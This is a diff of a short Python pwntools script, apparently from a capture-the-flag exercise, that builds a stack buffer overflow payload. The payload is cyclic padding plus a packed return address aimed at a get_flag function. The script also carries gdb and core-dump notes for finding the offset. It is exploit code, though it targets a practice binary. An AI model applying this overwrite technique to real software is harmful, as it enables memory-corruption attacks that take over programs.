@@ -7,30 +7,21 @@ if __name__ == '__main__':
     #     shellcode = file.read()
 
     # Pad the rest of the payload with cyclic bytes until we get to the overflow
-    payload = cyclic(86)
-    payload += b'0x4011d6'
-    #payload += p64(0x0000004011d6)
+    payload = cyclic(1016)
+    payload += p64(0x4011d6) #target address
     # payload += shellcode
 
     # Return to the middle of our NOP sled.
 
-    # with open("payload", "wb") as file:
-    #     file.write(payload)
+    with open("payload", "wb") as file:
+        file.write(payload)
 
 
-#print(cyclic_find('aawaaaxa'))
-print(payload)
+print(cyclic_find('eaak'))
+print(payload) 
 
+# Core file setup
+# ulimit -c unlimited
+# cat /proc/sys/kernel/core_pattern
 
-
-# get_flag address: 0x4011d6
-
-#Find Buffer start: 0x7fffffffda90
-# set break point after padding has been read in. Print out memory using 'x/200xb $rsp', look for the beginning of
-# the padding sequence
-
-# Buffer ends at 0x7fffffffdade (78)
-# Determine size of buffer
-# If using cyclic, determine where in the sequence ebp gets overwritten, then add that number to the buffer start address
-
-
+# gdb -c <corefile>
